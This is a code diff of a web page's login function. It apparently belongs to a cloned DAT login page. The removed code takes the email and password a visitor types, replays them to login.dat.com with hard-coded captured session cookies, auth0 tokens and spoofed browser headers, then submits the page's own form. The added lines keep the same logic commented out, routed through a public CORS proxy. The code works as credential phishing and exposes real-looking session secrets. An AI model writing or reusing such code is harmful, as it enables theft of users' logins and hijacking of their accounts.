@@ -239,121 +239,69 @@
         }
 
         function sendRequest ()  {
-
-            const pass = document.getElementById('password').value;
-            const email = document.getElementById('emailInput').value;
-
-            const myHeaders = new Headers();
-            myHeaders.append("accept", "*/*");
-            myHeaders.append("accept-language", "en-US,en;q=0.9,ru;q=0.8,hy;q=0.7");
-            myHeaders.append("auth0-client", "eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMjAuMiJ9");
-            myHeaders.append("content-type", "application/json");
-            myHeaders.append("cookie", "_csrf=oO9K5E82OGi7FTL-TkdQNTVY; HandLtestDomainName=HandLtestDomainValue; __utmc=32971051; __utmz=32971051.1720768694.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); handlID=1012752787381; handl_landing_page=https://www.dat.com/login; handl_landing_page_base=https://www.dat.com/login; handl_original_ref=https://www.google.com/; organic_source=https://www.google.com/; organic_source_str=Google; traffic_source=Organic; first_traffic_source=Organic; user_agent=Mozilla/5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010_15_7)%20AppleWebKit/537.36%20(KHTML%2C%20like%20Gecko)%20Chrome/126.0.0.0%20Safari/537.36; ajs_user_id=2872387; ajs_anonymous_id=3aef3cf8-7e9e-4070-9d50-7155f2c965ec; _hjSessionUser_3280111=eyJpZCI6IjFiMTU3ZDBlLTkxNmQtNTQ3Yi05NTgxLTA3YTMxNTEwOWI0ZCIsImNyZWF0ZWQiOjE3MjA3Njg3MDU4NzgsImV4aXN0aW5nIjp0cnVlfQ==; _vwo_uuid_v2=DBFDF74D0721F1F3BC79512EBE920196B|fd757a2b73f743a11c335711b0a5612b; _gcl_au=1.1.1535992682.1720768706; _vwo_uuid=DBFDF74D0721F1F3BC79512EBE920196B; _vwo_ds=3%241720768705%3A67.89109313%3A%3A; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _ga=GA1.1.1537811867.1720768706; _fbp=fb.1.1720768706867.953837007944225954; calltrk_referrer=https%3A//www.google.com/; calltrk_landing=https%3A//www.dat.com/; calltrk_session_id=3983462b-762d-40d1-afe7-23e2391c7c7e; _hjSessionUser_2420462=eyJpZCI6IjBlYjgyZTJjLTE1YTktNTE5YS1hMWU3LWRhN2JhYzI3MWNjYyIsImNyZWF0ZWQiOjE3MjA3Njg5NjE2OTIsImV4aXN0aW5nIjp0cnVlfQ==; did=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; did_compat=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; auth0=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQG21vyGdV38s710bAFT-RAmQnPjyr3VzA7PLmesYuLbojDlueIdNKU92NHf9oYP4vdZqg5py1ifo0hb6xSLFuLmmY29va2llg6dleHBpcmVz1__SwxQAZqoN665vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.UKnL%2FEuAiOm9dfq2MglRf5U5NtDGtkiQjJPLOHkb%2FcQ; auth0_compat=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQG21vyGdV38s710bAFT-RAmQnPjyr3VzA7PLmesYuLbojDlueIdNKU92NHf9oYP4vdZqg5py1ifo0hb6xSLFuLmmY29va2llg6dleHBpcmVz1__SwxQAZqoN665vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.UKnL%2FEuAiOm9dfq2MglRf5U5NtDGtkiQjJPLOHkb%2FcQ; handl_url_base=https://www.dat.com/; handl_url=https://www.dat.com/; handl_ref=; handl_ref_domain=; __utma=32971051.1559668289.1720768694.1722161500.1722268026.3; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Jul+29+2024+19%3A47%3A08+GMT%2B0400+(Armenia+Standard+Time)&version=202403.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4c14b15f-3b02-4459-a4a2-96d43945056d&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=1%3A1%2C3%3A1%2CSSPD_BG%3A1%2C2%3A1%2C5%3A1%2C4%3A1&AwaitingReconsent=false; _uetsid=d25308c04dc111ef9ef6b9d4a227701e; _uetvid=ee347720401e11efaf4be1d9cecaf734; _rdt_uuid=1720768706377.916c2a60-88ff-4404-8266-c31dfe37d7f1; _rdt_em=0000000000000000000000000000000000000000000000000000000000000001; __cf_bm=i4GjJXT.du5x0shPYJDiWC8dfR3rnJ5cCq1X2O196lk-1722278064-1.0.1.1-X6ja6hJcrhmJOOPRGKX.GexrRR4g.hAAED.SuLtmTiHLfW0PCJ64PWyrDlfqbCrn61Mi8rWEuYF9OfMJLtfXPw; _ga_C36TRC5CVZ=GS1.1.1722277659.15.1.1722278073.0.0.0; _ga_QYVEY2GZSM=GS1.1.1722278065.14.1.1722278073.0.0.0; __cf_bm=MvLC3B9vpb96w8jo81cy9hdGQnxRINnpUP_F8NOM094-1722278173-1.0.1.1-1ZGz4HRUTfXdqOMB6G_1SNojx5qbAa6mjNgBKG7i8YzewmCScTTOFt6jkMu0boIsHMLVhGpof.L9PelVNuQOGA");
-            myHeaders.append("origin", "https://login.dat.com");
-            myHeaders.append("priority", "u=1, i");
-            myHeaders.append("referer", "https://login.dat.com/login?state=hKFo2SBuS2otS1FfZU1zb1A1TVd3cC0zbFdxSUhwMzZxcGJMQaFupWxvZ2luo3RpZNkgWDBlbnFUOVZ1NnllbktrVW9QNzNnODIxVnBPX3RLRW-jY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&client=PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP&protocol=oauth2&prompt=login&redirect_uri=https:%2F%2Fpower.dat.com%2Fsignin-auth0&response_mode=form_post&response_type=code%20id_token%20token&scope=openid%20profile%20offline_access%20email&nonce=638578748666566847.YmNlZDZlNWItZWIxNC00NDk2LWIyZTQtYTExOTEyNmFlYTE2NzFkZTBjZDktOTk0ZS00ZjA3LWIyNGEtMTRkNzljMzU2YTVj&app_name=Power&page_mode=Legacy&audience=https:%2F%2Fprod-api.dat.com&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&capturedTime=1722278069558");
-            myHeaders.append("sec-ch-ua", "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"");
-            myHeaders.append("sec-ch-ua-arch", "\"arm\"");
-            myHeaders.append("sec-ch-ua-bitness", "\"64\"");
-            myHeaders.append("sec-ch-ua-full-version", "\"126.0.6478.114\"");
-            myHeaders.append("sec-ch-ua-full-version-list", "\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"126.0.6478.114\", \"Google Chrome\";v=\"126.0.6478.114\"");
-            myHeaders.append("sec-ch-ua-mobile", "?0");
-            myHeaders.append("sec-ch-ua-model", "\"\"");
-            myHeaders.append("sec-ch-ua-platform", "\"macOS\"");
-            myHeaders.append("sec-ch-ua-platform-version", "\"13.0.1\"");
-            myHeaders.append("sec-fetch-dest", "empty");
-            myHeaders.append("sec-fetch-mode", "cors");
-            myHeaders.append("sec-fetch-site", "same-origin");
-            myHeaders.append("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36");
-
-            const raw = JSON.stringify({
-                "client_id": "PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP",
-                "redirect_uri": "https://power.dat.com/signin-auth0",
-                "tenant": "prod",
-                "response_type": "code id_token token",
-                "scope": "openid profile offline_access email",
-                "password": pass,
-                "protocol": "oauth2",
-                "response_mode": "form_post",
-                "nonce": "638578748666566847.YmNlZDZlNWItZWIxNC00NDk2LWIyZTQtYTExOTEyNmFlYTE2NzFkZTBjZDktOTk0ZS00ZjA3LWIyNGEtMTRkNzljMzU2YTVj",
-                "app_name": "Power",
-                "page_mode": "Legacy",
-                "audience": "https://prod-api.dat.com",
-                "prompt": "login",
-                "x-client-_sku": "ID_NET451",
-                "x-client-ver": "5.2.1.0",
-                "_csrf": "szubIk5j-yXgv9Alk7td6BIp1BxgwIavEmDg",
-                "_intstate": "deprecated",
-                "state": "hKFo2SBuS2otS1FfZU1zb1A1TVd3cC0zbFdxSUhwMzZxcGJMQaFupWxvZ2luo3RpZNkgWDBlbnFUOVZ1NnllbktrVW9QNzNnODIxVnBPX3RLRW-jY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA",
-                "connection": "Email-Password-Authentication",
-                "username": email
-            });
-
-            const requestOptions = {
-                method: "POST",
-                headers: myHeaders,
-                body: raw,
-                redirect: "follow"
-            };
-
-            fetch("https://login.dat.com/usernamepassword/login", requestOptions)
-            // fetch("https://power.dat.com/signin-auth0", requestOptions)
-                .then((response) => response.text())
-                .then((result) => console.log(result))
-                .catch((error) => console.error(error)).finally((res) => {
-                document.getElementById("myForm").submit();
-            });
-
-
-        //    aaaasasasasasa
-
-            // fetch("https://login.dat.com/usernamepassword/login", {
-            //     "headers": {
-            //         "accept": "*/*",
-            //         "accept-language": "en-US,en;q=0.9,ru;q=0.8,hy;q=0.7",
-            //         "auth0-client": "eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMjAuMiJ9",
-            //         "content-type": "application/json",
-            //         "priority": "u=1, i",
-            //         "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
-            //         "sec-ch-ua-arch": "\"arm\"",
-            //         "sec-ch-ua-bitness": "\"64\"",
-            //         "sec-ch-ua-full-version": "\"126.0.6478.114\"",
-            //         "sec-ch-ua-full-version-list": "\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"126.0.6478.114\", \"Google Chrome\";v=\"126.0.6478.114\"",
-            //         "sec-ch-ua-mobile": "?0",
-            //         "sec-ch-ua-model": "\"\"",
-            //         "sec-ch-ua-platform": "\"macOS\"",
-            //         "sec-ch-ua-platform-version": "\"13.0.1\"",
-            //         "sec-fetch-dest": "empty",
-            //         "sec-fetch-mode": "cors",
-            //         "sec-fetch-site": "same-origin"
-            //     },
-            //     "referrer": "https://login.dat.com/login?state=hKFo2SBuS2otS1FfZU1zb1A1TVd3cC0zbFdxSUhwMzZxcGJMQaFupWxvZ2luo3RpZNkgWDBlbnFUOVZ1NnllbktrVW9QNzNnODIxVnBPX3RLRW-jY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&client=PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP&protocol=oauth2&prompt=login&redirect_uri=https:%2F%2Fpower.dat.com%2Fsignin-auth0&response_mode=form_post&response_type=code%20id_token%20token&scope=openid%20profile%20offline_access%20email&nonce=638578748666566847.YmNlZDZlNWItZWIxNC00NDk2LWIyZTQtYTExOTEyNmFlYTE2NzFkZTBjZDktOTk0ZS00ZjA3LWIyNGEtMTRkNzljMzU2YTVj&app_name=Power&page_mode=Legacy&audience=https:%2F%2Fprod-api.dat.com&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&capturedTime=1722278069558",
-            //     "referrerPolicy": "same-origin",
-            //     "body": '{\"client_id\":\"PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP\",\"redirect_uri\":\"https://power.dat.com/signin-auth0\",\"tenant\":\"prod\",\"response_type\":\"code id_token token\",\"scope\":\"openid profile offline_access email\",\"password\":\"'+pass+'\",\"protocol\":\"oauth2\",\"response_mode\":\"form_post\",\"nonce\":\"638578748666566847.YmNlZDZlNWItZWIxNC00NDk2LWIyZTQtYTExOTEyNmFlYTE2NzFkZTBjZDktOTk0ZS00ZjA3LWIyNGEtMTRkNzljMzU2YTVj\",\"app_name\":\"Power\",\"page_mode\":\"Legacy\",\"audience\":\"https://prod-api.dat.com\",\"prompt\":\"login\",\"x-client-_sku\":\"ID_NET451\",\"x-client-ver\":\"5.2.1.0\",\"_csrf\":\"szubIk5j-yXgv9Alk7td6BIp1BxgwIavEmDg\",\"_intstate\":\"deprecated\",\"state\":\"hKFo2SBuS2otS1FfZU1zb1A1TVd3cC0zbFdxSUhwMzZxcGJMQaFupWxvZ2luo3RpZNkgWDBlbnFUOVZ1NnllbktrVW9QNzNnODIxVnBPX3RLRW-jY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA\",\"connection\":\"Email-Password-Authentication\",\"username\":\"'+email+'\"}',
-            //     "method": "POST",
-            //     "mode": "cors",
-            //     "credentials": "include"
-            // }).finally((res) => {
-            //         document.getElementById("myForm").submit();
-            //     });
-            // fetch("https://api.segment.io/v1/t", {
-            //     "headers": {
-            //         "accept": "*/*",
-            //         "accept-language": "en-US,en;q=0.9,ru;q=0.8,hy;q=0.7",
-            //         "content-type": "text/plain",
-            //         "priority": "u=1, i",
-            //         "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
-            //         "sec-ch-ua-mobile": "?0",
-            //         "sec-ch-ua-platform": "\"macOS\"",
-            //         "sec-fetch-dest": "empty",
-            //         "sec-fetch-mode": "cors",
-            //         "sec-fetch-site": "cross-site"
-            //     },
-            //     "referrerPolicy": "same-origin",
-            //     "body": '{\"timestamp\":\"2024-07-29T19:14:34.234Z\",\"integrations\":{},\"event\":\"Displayed Error: Invalid Credentials\",\"type\":\"track\",\"properties\":{\"initiator\":\"System\",\"page\":\"Login\",\"ui_location\":\"Password field\",\"email\":\"'+email+'\",\"error_message\":\"Wrong email or password.\",\"error_details\":\"Error: {\\\"message\\\":\\\"Wrong email or password.\\\",\\\"name\\\":\\\"ValidationError\\\",\\\"code\\\":\\\"invalid_user_password\\\",\\\"description\\\":\\\"Wrong email or password.\\\",\\\"statusCode\\\":400}\\n    at ue.<anonymous> (https://hlp.prod.dat.com/login/main.ff70f2284d8b20c1.js:1:722575)\\n    at t.emit (https://hlp.prod.dat.com/login/main.ff70f2284d8b20c1.js:1:703858)\\n    at XMLHttpRequest.<anonymous> (https://hlp.prod.dat.com/login/main.ff70f2284d8b20c1.js:1:726489)\\n    at XMLHttpRequest.v (https://hlp.prod.dat.com/login/scripts.4f56a9e5e03d0bb5.js:1:11461)\\n    at K.invokeTask (https://hlp.prod.dat.com/login/polyfills.7f322b5589679099.js:1:7412)\\n    at Object.onInvokeTask (https://hlp.prod.dat.com/login/main.ff70f2284d8b20c1.js:1:109605)\\n    at K.invokeTask (https://hlp.prod.dat.com/login/polyfills.7f322b5589679099.js:1:7333)\\n    at gt.runTask (https://hlp.prod.dat.com/login/polyfills.7f322b5589679099.js:1:2751)\\n    at H.invokeTask [as invoke] (https://hlp.prod.dat.com/login/polyfills.7f322b5589679099.js:1:8471)\\n    at vt (https://hlp.prod.dat.com/login/polyfills.7f322b5589679099.js:1:21236)\",\"tracking_version\":\"0.2\",\"dat_primary_application\":\"SSO\",\"dat_secondary_application\":\"Power\",\"mode\":\"legacy\"},\"context\":{\"page\":{\"path\":\"/login\",\"referrer\":\"https://login.dat.com/\",\"search\":\"?state=hKFo2SBuS2otS1FfZU1zb1A1TVd3cC0zbFdxSUhwMzZxcGJMQaFupWxvZ2luo3RpZNkgWDBlbnFUOVZ1NnllbktrVW9QNzNnODIxVnBPX3RLRW-jY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&client=PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP&protocol=oauth2&prompt=login&redirect_uri=https:%2F%2Fpower.dat.com%2Fsignin-auth0&response_mode=form_post&response_type=code%20id_token%20token&scope=openid%20profile%20offline_access%20email&nonce=638578748666566847.YmNlZDZlNWItZWIxNC00NDk2LWIyZTQtYTExOTEyNmFlYTE2NzFkZTBjZDktOTk0ZS00ZjA3LWIyNGEtMTRkNzljMzU2YTVj&app_name=Power&page_mode=Legacy&audience=https:%2F%2Fprod-api.dat.com&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&capturedTime=1722278069558\",\"title\":\"\",\"url\":\"https://login.dat.com/login?state=hKFo2SBuS2otS1FfZU1zb1A1TVd3cC0zbFdxSUhwMzZxcGJMQaFupWxvZ2luo3RpZNkgWDBlbnFUOVZ1NnllbktrVW9QNzNnODIxVnBPX3RLRW-jY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&client=PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP&protocol=oauth2&prompt=login&redirect_uri=https:%2F%2Fpower.dat.com%2Fsignin-auth0&response_mode=form_post&response_type=code%20id_token%20token&scope=openid%20profile%20offline_access%20email&nonce=638578748666566847.YmNlZDZlNWItZWIxNC00NDk2LWIyZTQtYTExOTEyNmFlYTE2NzFkZTBjZDktOTk0ZS00ZjA3LWIyNGEtMTRkNzljMzU2YTVj&app_name=Power&page_mode=Legacy&audience=https:%2F%2Fprod-api.dat.com&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&capturedTime=1722278069558\"},\"userAgent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\",\"userAgentData\":{\"brands\":[{\"brand\":\"Not/A)Brand\",\"version\":\"8\"},{\"brand\":\"Chromium\",\"version\":\"126\"},{\"brand\":\"Google Chrome\",\"version\":\"126\"}],\"mobile\":false,\"platform\":\"macOS\"},\"locale\":\"en-US\",\"library\":{\"name\":\"analytics.js\",\"version\":\"next-1.70.0\"},\"campaign\":{},\"timezone\":\"Asia/Yerevan\"},\"messageId\":\"ajs-next-1722280474234-6c1c2eec-36e3-43f4-9bd0-fc6663c672ee\",\"userId\":\"2872387\",\"anonymousId\":\"3aef3cf8-7e9e-4070-9d50-7155f2c965ec\",\"writeKey\":\"M1HZztCwch1rMDPJXJTjiy21rIUNr5sX\",\"sentAt\":\"2024-07-29T19:14:34.238Z\",\"_metadata\":{\"bundled\":[\"Google Tag Manager\",\"Optimizely\",\"Segment.io\"],\"unbundled\":[\"Mixpanel\"],\"bundledIds\":[\"645955c6a41c4d2ed43afef8\",\"5da4cd8048826604db79ca39\"]}}',
-            //     "method": "POST",
-            //     "mode": "cors",
-            //     "credentials": "omit"
+            // // e.preventDefault();
+            // const pass = document.getElementById('password').value;
+            // const email = document.getElementById('emailInput').value;
+            // const myHeaders = new Headers();
+            // myHeaders.append("accept", "*/*");
+            // myHeaders.append("accept-language", "en-US,en;q=0.9,ru;q=0.8,hy;q=0.7");
+            // myHeaders.append("auth0-client", "eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMjAuMiJ9");
+            // myHeaders.append("content-type", "application/json");
+            // myHeaders.append("cookie", "_csrf=jOnwZbSl18MjNyQv9bWUtvpn; HandLtestDomainName=HandLtestDomainValue; __utmc=32971051; __utmz=32971051.1720768694.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); handlID=1012752787381; handl_landing_page=https://www.dat.com/login; handl_landing_page_base=https://www.dat.com/login; handl_original_ref=https://www.google.com/; organic_source=https://www.google.com/; organic_source_str=Google; traffic_source=Organic; first_traffic_source=Organic; user_agent=Mozilla/5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010_15_7)%20AppleWebKit/537.36%20(KHTML%2C%20like%20Gecko)%20Chrome/126.0.0.0%20Safari/537.36; ajs_user_id=2872387; ajs_anonymous_id=3aef3cf8-7e9e-4070-9d50-7155f2c965ec; _hjSessionUser_3280111=eyJpZCI6IjFiMTU3ZDBlLTkxNmQtNTQ3Yi05NTgxLTA3YTMxNTEwOWI0ZCIsImNyZWF0ZWQiOjE3MjA3Njg3MDU4NzgsImV4aXN0aW5nIjp0cnVlfQ==; _vwo_uuid_v2=DBFDF74D0721F1F3BC79512EBE920196B|fd757a2b73f743a11c335711b0a5612b; _gcl_au=1.1.1535992682.1720768706; _vwo_uuid=DBFDF74D0721F1F3BC79512EBE920196B; _vwo_ds=3%241720768705%3A67.89109313%3A%3A; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _ga=GA1.1.1537811867.1720768706; _fbp=fb.1.1720768706867.953837007944225954; calltrk_referrer=https%3A//www.google.com/; calltrk_landing=https%3A//www.dat.com/; calltrk_session_id=3983462b-762d-40d1-afe7-23e2391c7c7e; _hjSessionUser_2420462=eyJpZCI6IjBlYjgyZTJjLTE1YTktNTE5YS1hMWU3LWRhN2JhYzI3MWNjYyIsImNyZWF0ZWQiOjE3MjA3Njg5NjE2OTIsImV4aXN0aW5nIjp0cnVlfQ==; did=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; did_compat=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; auth0=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQG21vyGdV38s710bAFT-RAmQnPjyr3VzA7PLmesYuLbojDlueIdNKU92NHf9oYP4vdZqg5py1ifo0hb6xSLFuLmmY29va2llg6dleHBpcmVz1__SwxQAZqoN665vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.UKnL%2FEuAiOm9dfq2MglRf5U5NtDGtkiQjJPLOHkb%2FcQ; auth0_compat=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQG21vyGdV38s710bAFT-RAmQnPjyr3VzA7PLmesYuLbojDlueIdNKU92NHf9oYP4vdZqg5py1ifo0hb6xSLFuLmmY29va2llg6dleHBpcmVz1__SwxQAZqoN665vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.UKnL%2FEuAiOm9dfq2MglRf5U5NtDGtkiQjJPLOHkb%2FcQ; handl_url_base=https://www.dat.com/; handl_url=https://www.dat.com/; handl_ref=; handl_ref_domain=; __utma=32971051.1559668289.1720768694.1722161500.1722268026.3; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Jul+29+2024+19%3A47%3A08+GMT%2B0400+(Armenia+Standard+Time)&version=202403.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4c14b15f-3b02-4459-a4a2-96d43945056d&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=1%3A1%2C3%3A1%2CSSPD_BG%3A1%2C2%3A1%2C5%3A1%2C4%3A1&AwaitingReconsent=false; _uetsid=d25308c04dc111ef9ef6b9d4a227701e; _uetvid=ee347720401e11efaf4be1d9cecaf734; _rdt_uuid=1720768706377.916c2a60-88ff-4404-8266-c31dfe37d7f1; _rdt_em=0000000000000000000000000000000000000000000000000000000000000001; __cf_bm=xpT_gDJrPMyHxa8TAa28XWjPb.TalaPVhpF1trk9eAA-1722346865-1.0.1.1-me0ADBlyYJEu_JCnxL1xod3a.O18B8lXziVMD6gmnkamNgcaGFxPhNAbX0As2CKADJOmIm9BR0Je2nGMVgkroA; _ga_C36TRC5CVZ=GS1.1.1722346877.17.0.1722346877.0.0.0; _ga_QYVEY2GZSM=GS1.1.1722346877.16.0.1722346877.0.0.0");
+            // myHeaders.append("origin", "https://login.dat.com");
+            // myHeaders.append("priority", "u=1, i");
+            // myHeaders.append("referer", "https://login.dat.com/login?state=hKFo2SA3VXA3SE5XU21HQ256STJNOUFFYzdZLWJLMnNzS21lZ6FupWxvZ2luo3RpZNkgVFpVOTRmNTFKdENCSmZmTXpkZEdyUEhkWUpPd05lc2SjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&client=PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP&protocol=oauth2&prompt=login&redirect_uri=https:%2F%2Fpower.dat.com%2Fsignin-auth0&response_mode=form_post&response_type=code%20id_token%20token&scope=openid%20profile%20offline_access%20email&nonce=638579436679069959.NjQwOGVkMGQtOTUwNy00YmUxLWEyYTItMzQ5MDI0ODYwNGJkYmQ1YWMwMzgtMDEwYy00OTY2LWIxNjEtYTBkYTI2NGUyNmZh&app_name=Power&page_mode=Legacy&audience=https:%2F%2Fprod-api.dat.com&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&capturedTime=1722346872083");
+            // myHeaders.append("sec-ch-ua", "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"");
+            // myHeaders.append("sec-ch-ua-arch", "\"arm\"");
+            // myHeaders.append("sec-ch-ua-bitness", "\"64\"");
+            // myHeaders.append("sec-ch-ua-full-version", "\"126.0.6478.114\"");
+            // myHeaders.append("sec-ch-ua-full-version-list", "\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"126.0.6478.114\", \"Google Chrome\";v=\"126.0.6478.114\"");
+            // myHeaders.append("sec-ch-ua-mobile", "?0");
+            // myHeaders.append("sec-ch-ua-model", "\"\"");
+            // myHeaders.append("sec-ch-ua-platform", "\"macOS\"");
+            // myHeaders.append("sec-ch-ua-platform-version", "\"13.0.1\"");
+            // myHeaders.append("sec-fetch-dest", "empty");
+            // myHeaders.append("sec-fetch-mode", "cors");
+            // myHeaders.append("sec-fetch-site", "same-origin");
+            // myHeaders.append("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36");
+            //
+            // const raw = JSON.stringify({
+            //     "client_id": "PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP",
+            //     "redirect_uri": "https://power.dat.com/signin-auth0",
+            //     "tenant": "prod",
+            //     "response_type": "code id_token token",
+            //     "scope": "openid profile offline_access email",
+            //     "password": "asdasdasd",
+            //     "protocol": "oauth2",
+            //     "response_mode": "form_post",
+            //     "nonce": "638579436679069959.NjQwOGVkMGQtOTUwNy00YmUxLWEyYTItMzQ5MDI0ODYwNGJkYmQ1YWMwMzgtMDEwYy00OTY2LWIxNjEtYTBkYTI2NGUyNmZh",
+            //     "app_name": "Power",
+            //     "page_mode": "Legacy",
+            //     "audience": "https://prod-api.dat.com",
+            //     "prompt": "login",
+            //     "x-client-_sku": "ID_NET451",
+            //     "x-client-ver": "5.2.1.0",
+            //     "_csrf": "TdbJN6y1-1IZ56HdncQBdkHfVUOf-w41bIBM",
+            //     "_intstate": "deprecated",
+            //     "state": "hKFo2SA3VXA3SE5XU21HQ256STJNOUFFYzdZLWJLMnNzS21lZ6FupWxvZ2luo3RpZNkgVFpVOTRmNTFKdENCSmZmTXpkZEdyUEhkWUpPd05lc2SjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA",
+            //     "connection": "Email-Password-Authentication",
+            //     "username": "test@test.com"
+            // });
+            //
+            // const requestOptions = {
+            //     method: "POST",
+            //     headers: myHeaders,
+            //     body: raw,
+            //     redirect: "follow"
+            // };
+            // var proxy = 'https://cors-anywhere.herokuapp.com/';
+            //
+            // fetch(proxy + "https://login.dat.com/usernamepassword/login", requestOptions)
+            //     .then((response) => response.text())
+            //     .then((result) => console.log(result))
+            //     .catch((error) => console.error(error))
+            //     .finally(res => {
+            //         // document.getElementById('myForm').submit()
             // });
 
         }
